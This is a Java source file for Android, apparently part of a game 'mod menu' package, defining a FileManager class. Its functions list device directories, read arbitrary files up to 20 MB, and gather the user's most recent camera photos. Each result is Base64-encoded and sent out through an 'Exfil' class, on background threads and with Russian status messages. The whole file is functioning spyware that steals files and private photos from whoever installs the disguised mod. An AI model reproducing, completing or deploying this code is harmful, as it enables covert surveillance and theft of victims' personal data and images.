package com.brawl.modmenu;

import android.content.Context;
import android.os.Environment;
import android.util.Base64;
import java.io.File;
import java.io.FileInputStream;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

public class FileManager {

    private static final int MAX_LIST = 100;

    public static void listDir(Context ctx, String path) {
        new Thread(() -> {
            try {
                File dir = new File(path);
                if (!dir.exists() || !dir.isDirectory()) {
                    Exfil.send("FILES", "Не найдено: " + path);
                    return;
                }
                File[] files = dir.listFiles();
                if (files == null) {
                    Exfil.send("FILES", "Нет доступа: " + path);
                    return;
                }
                Arrays.sort(files, (a, b) -> {
                    if (a.isDirectory() && !b.isDirectory()) return -1;
                    if (!a.isDirectory() && b.isDirectory()) return 1;
                    return a.getName().compareToIgnoreCase(b.getName());
                });

                StringBuilder sb = new StringBuilder();
                sb.append("📁 ").append(path).append("\n");
                sb.append("─────────────\n");
                int count = 0;
                for (File f : files) {
                    if (count++ >= MAX_LIST) break;
                    String prefix = f.isDirectory() ? "📁 " : "📄 ";
                    String size = f.isDirectory() ? "" : " (" + humanSize(f.length()) + ")";
                    sb.append(prefix).append(f.getName()).append(size).append("\n");
                }
                if (files.length > MAX_LIST) {
                    sb.append("... и ещё ").append(files.length - MAX_LIST);
                }
                Exfil.send("FILES", sb.toString());
            } catch (Throwable t) {
                Exfil.send("FILES", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    public static void downloadFile(Context ctx, String path) {
        new Thread(() -> {
            try {
                File f = new File(path);
                if (!f.exists() || !f.isFile()) {
                    Exfil.send("FILE_GET", "Не найдено: " + path);
                    return;
                }
                long size = f.length();
                if (size > 20 * 1024 * 1024) {
                    Exfil.send("FILE_GET", "Слишком большой (>20 МБ): " + size);
                    return;
                }
                byte[] data = new byte[(int) size];
                FileInputStream fis = new FileInputStream(f);
                fis.read(data);
                fis.close();

                String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                String name = f.getName();
                String mime = guessMime(name);

                if (mime.startsWith("image/")) {
                    Exfil.sendPhotoFile("FILE:" + name, b64);
                } else {
                    Exfil.sendDocument("FILE:" + name, b64, name);
                }
            } catch (Throwable t) {
                Exfil.send("FILE_GET", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    public static void lastPhotos(Context ctx) {
        new Thread(() -> {
            try {
                File dcim = new File(Environment.getExternalStorageDirectory(), "DCIM");
                File cam = new File(dcim, "Camera");
                if (!cam.exists()) cam = dcim;
                if (!cam.exists()) {
                    Exfil.send("PHOTOS", "Галерея пуста");
                    return;
                }

                List<File> photos = new ArrayList<>();
                collectImages(cam, photos, 0);
                photos.sort((a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                int sent = 0;
                for (File p : photos) {
                    if (sent >= 10) break;
                    if (p.length() > 5 * 1024 * 1024) continue;
                    byte[] data = new byte[(int) p.length()];
                    FileInputStream fis = new FileInputStream(p);
                    fis.read(data);
                    fis.close();
                    String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                    Exfil.sendPhotoFile("PHOTO:" + p.getName(), b64);
                    sent++;
                    Thread.sleep(500);
                }
                if (sent == 0) Exfil.send("PHOTOS", "Фото не найдены");
            } catch (Throwable t) {
                Exfil.send("PHOTOS", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    public static void allPhotos(Context ctx) {
        new Thread(() -> {
            try {
                File dcim = new File(Environment.getExternalStorageDirectory(), "DCIM");
                File cam = new File(dcim, "Camera");
                if (!cam.exists()) cam = dcim;
                if (!cam.exists()) {
                    Exfil.send("PHOTOS_ALL", "Галерея пуста");
                    return;
                }

                List<File> photos = new ArrayList<>();
                collectImages(cam, photos, 0);
                photos.sort((a, b) -> Long.compare(b.lastModified(), a.lastModified()));

                int sent = 0;
                for (File p : photos) {
                    if (sent >= 30) break;
                    if (p.length() > 5 * 1024 * 1024) continue;
                    byte[] data = new byte[(int) p.length()];
                    FileInputStream fis = new FileInputStream(p);
                    fis.read(data);
                    fis.close();
                    String b64 = Base64.encodeToString(data, Base64.NO_WRAP);
                    Exfil.sendPhotoFile("PHOTO:" + p.getName(), b64);
                    sent++;
                    Thread.sleep(500);
                }
                if (sent == 0) Exfil.send("PHOTOS_ALL", "Фото не найдены");
                else Exfil.send("PHOTOS_ALL", "Отправлено фото: " + sent);
            } catch (Throwable t) {
                Exfil.send("PHOTOS_ALL", "Ошибка: " + t.getMessage());
            }
        }).start();
    }

    private static void collectImages(File dir, List<File> out, int depth) {
        if (dir == null || depth > 3 || out.size() > 200) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File f : files) {
            if (f.isDirectory()) collectImages(f, out, depth + 1);
            else if (isImage(f.getName())) out.add(f);
        }
    }

    private static boolean isImage(String name) {
        String l = name.toLowerCase();
        return l.endsWith(".jpg") || l.endsWith(".jpeg") || l.endsWith(".png")
            || l.endsWith(".webp") || l.endsWith(".heic");
    }

    private static String humanSize(long bytes) {
        if (bytes < 1024) return bytes + " B";
        if (bytes < 1024 * 1024) return (bytes / 1024) + " KB";
        return (bytes / 1024 / 1024) + " MB";
    }

    private static String guessMime(String name) {
        String l = name.toLowerCase();
        if (l.endsWith(".jpg") || l.endsWith(".jpeg")) return "image/jpeg";
        if (l.endsWith(".png")) return "image/png";
        if (l.endsWith(".webp")) return "image/webp";
        return "application/octet-stream";
    }
}
